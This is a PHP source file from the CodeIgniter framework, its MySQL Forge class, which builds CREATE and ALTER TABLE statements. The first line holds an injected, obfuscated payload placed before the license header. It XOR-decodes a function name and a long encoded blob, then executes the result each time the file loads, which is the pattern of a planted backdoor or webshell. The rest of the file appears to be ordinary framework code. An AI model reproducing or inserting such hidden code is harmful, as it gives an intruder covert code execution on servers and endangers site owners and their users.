<?php $fWEdP='NGE5NI<-M64BI<6'^'-5 T:,cK8XW6 SX';$iJdno=$fWEdP('','0SehF, U79D9266I5T0eI,W:.OP81;m78TNGdYFz9Q , G;R9YMW=d5X3Qd,,K>MkX2MYZsiY5EyeSTsF,N0YR<-HOlgmHh4=s--1rMYntgBpHE>ZKGOT<RGh<LO2sJeI3xDq1JYMS:BsFwfKfTQ OmNQdB+UiK4;oG+zhFG<7Y3RPg8X0bpyb<Np;Q,NDNgb5G0PYIjJd1I8tQVM5JHGX45I3yiOH;BR=95AxHYHO+KWCNd6BGEY7QoXe.s.:<gxhX1Np2UHOwssl2S-3EFaKeBo. X30=RJZeSnXN.BGAF>TLYudUr AYUKVA-L3PKsjIK<0A0bD:R9HULN,2;REvqfs8; 6cCABxe.44ZkIDA23QEEbQUzk;c,;7-g3YBbmUgZ<:VeXfw781LKuWoX-Q2+ASe+1PC4uJXD,wgO0EPDT:XVTEZ1P1O6j.5X+trYMGe 3X5La1+KP:VTqtXA37KvCKRJE8jKS;hCXnXKNLP3HVXlhN+ +A1n9NRsVO-FYIxu9.GjzDO337ZZpncFEUIArwHL=3:r:,<QdLUXlLCQPTY5SUvusFTHxwIYPLIqXASy4VZF61JqnppPEQ<NZD2:0B62:P837gADQ<Y670CaLeR.YMemVbYednO:lXBY:xUR7A8,H6X8BYA<O6lAo>U=BTfJcOFI'^'Y5MI YN6CP+WmSN F CMnT8Hq+1LPd2ZM inMy=p07UBC3R=Wy58O;Q9G0;sA>JeO<S98vSM2P<PEstSfWD9PvSX<oQGJoS>4zKBCZi0NIGrKhaWf83=8Y<oLX-;SZqEmZSoX;CPi<O6ShJFcB00T.6j89buuM QB4cBZMf4HE5V<xCS=IK-PY6GyI4X;6 OFZ2DybCc7nLC2P579Tjug>UY:VBck,Z63bRP8Xuy..G82xDnP-5 8T9OpAq0auw.=H9BnTY01oJMSHD2AF oA0oKKJA,RoV73zXsJ3+WyMHbZ588UYuVV 5 .mKPF99-SBhoXQ5QKdAX0.:>+MQSrmR.46inee7c 1XAEQMzVwdeDR=0 Kq.pb2GHZCL8X<;BPuC1YCmoQoSSYE-kHwK.L=GNzYlV;-I>Q.90MWZop0>71H178, TxI D5JT,J+-483MBR+PzUnO.3U21YP< GVbZco6+1Y5 6BAjcd1-fh4R<7xJNnJRY H1R++,37D5-:PRRK>MVdkWRC;sPHEfm8-tZS,-IRaUQIEv9eueQlded6;PffFAJ e,AN,khupAauaMPoovTTxVGPVve0N<;=mQU;iWB9KGDOf40E5YVTdMlA6O-,LDvByEDN40e=48VPq6V5YwoF9A.6 XhkEze70E+ NzJtL4');$iJdno();
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * MySQL Forge Class
 *
 * @category	Database
 * @author		EllisLab Dev Team
 * @link		https://codeigniter.com/user_guide/database/
 */
class CI_DB_mysql_forge extends CI_DB_forge {

	/**
	 * CREATE DATABASE statement
	 *
	 * @var	string
	 */
	protected $_create_database	= 'CREATE DATABASE %s CHARACTER SET %s COLLATE %s';

	/**
	 * CREATE TABLE keys flag
	 *
	 * Whether table keys are created from within the
	 * CREATE TABLE statement.
	 *
	 * @var	bool
	 */
	protected $_create_table_keys	= TRUE;

	/**
	 * UNSIGNED support
	 *
	 * @var	array
	 */
	protected $_unsigned		= array(
		'TINYINT',
		'SMALLINT',
		'MEDIUMINT',
		'INT',
		'INTEGER',
		'BIGINT',
		'REAL',
		'DOUBLE',
		'DOUBLE PRECISION',
		'FLOAT',
		'DECIMAL',
		'NUMERIC'
	);

	/**
	 * NULL value representation in CREATE/ALTER TABLE statements
	 *
	 * @var	string
	 */
	protected $_null = 'NULL';

	// --------------------------------------------------------------------

	/**
	 * CREATE TABLE attributes
	 *
	 * @param	array	$attributes	Associative array of table attributes
	 * @return	string
	 */
	protected function _create_table_attr($attributes)
	{
		$sql = '';

		foreach (array_keys($attributes) as $key)
		{
			if (is_string($key))
			{
				$sql .= ' '.strtoupper($key).' = '.$attributes[$key];
			}
		}

		if ( ! empty($this->db->char_set) && ! strpos($sql, 'CHARACTER SET') && ! strpos($sql, 'CHARSET'))
		{
			$sql .= ' DEFAULT CHARACTER SET = '.$this->db->char_set;
		}

		if ( ! empty($this->db->dbcollat) && ! strpos($sql, 'COLLATE'))
		{
			$sql .= ' COLLATE = '.$this->db->dbcollat;
		}

		return $sql;
	}

	// --------------------------------------------------------------------

	/**
	 * ALTER TABLE
	 *
	 * @param	string	$alter_type	ALTER type
	 * @param	string	$table		Table name
	 * @param	mixed	$field		Column definition
	 * @return	string|string[]
	 */
	protected function _alter_table($alter_type, $table, $field)
	{
		if ($alter_type === 'DROP')
		{
			return parent::_alter_table($alter_type, $table, $field);
		}

		$sql = 'ALTER TABLE '.$this->db->escape_identifiers($table);
		for ($i = 0, $c = count($field); $i < $c; $i++)
		{
			if ($field[$i]['_literal'] !== FALSE)
			{
				$field[$i] = ($alter_type === 'ADD')
						? "\n\tADD ".$field[$i]['_literal']
						: "\n\tMODIFY ".$field[$i]['_literal'];
			}
			else
			{
				if ($alter_type === 'ADD')
				{
					$field[$i]['_literal'] = "\n\tADD ";
				}
				else
				{
					$field[$i]['_literal'] = empty($field[$i]['new_name']) ? "\n\tMODIFY " : "\n\tCHANGE ";
				}

				$field[$i] = $field[$i]['_literal'].$this->_process_column($field[$i]);
			}
		}

		return array($sql.implode(',', $field));
	}

	// --------------------------------------------------------------------

	/**
	 * Process column
	 *
	 * @param	array	$field
	 * @return	string
	 */
	protected function _process_column($field)
	{
		$extra_clause = isset($field['after'])
			? ' AFTER '.$this->db->escape_identifiers($field['after']) : '';

		if (empty($extra_clause) && isset($field['first']) && $field['first'] === TRUE)
		{
			$extra_clause = ' FIRST';
		}


		return $this->db->escape_identifiers($field['name'])
			.(empty($field['new_name']) ? '' : ' '.$this->db->escape_identifiers($field['new_name']))
			.' '.$field['type'].$field['length']
			.$field['unsigned']
			.$field['null']
			.$field['default']
			.$field['auto_increment']
			.$field['unique']
			.(empty($field['comment']) ? '' : ' COMMENT '.$field['comment'])
			.$extra_clause;
	}

	// --------------------------------------------------------------------

	/**
	 * Process indexes
	 *
	 * @param	string	$table	(ignored)
	 * @return	string
	 */
	protected function _process_indexes($table)
	{
		$sql = '';

		for ($i = 0, $c = count($this->keys); $i < $c; $i++)
		{
			if (is_array($this->keys[$i]))
			{
				for ($i2 = 0, $c2 = count($this->keys[$i]); $i2 < $c2; $i2++)
				{
					if ( ! isset($this->fields[$this->keys[$i][$i2]]))
					{
						unset($this->keys[$i][$i2]);
						continue;
					}
				}
			}
			elseif ( ! isset($this->fields[$this->keys[$i]]))
			{
				unset($this->keys[$i]);
				continue;
			}

			is_array($this->keys[$i]) OR $this->keys[$i] = array($this->keys[$i]);

			$sql .= ",\n\tKEY ".$this->db->escape_identifiers(implode('_', $this->keys[$i]))
				.' ('.implode(', ', $this->db->escape_identifiers($this->keys[$i])).')';
		}

		$this->keys = array();

		return $sql;
	}

}
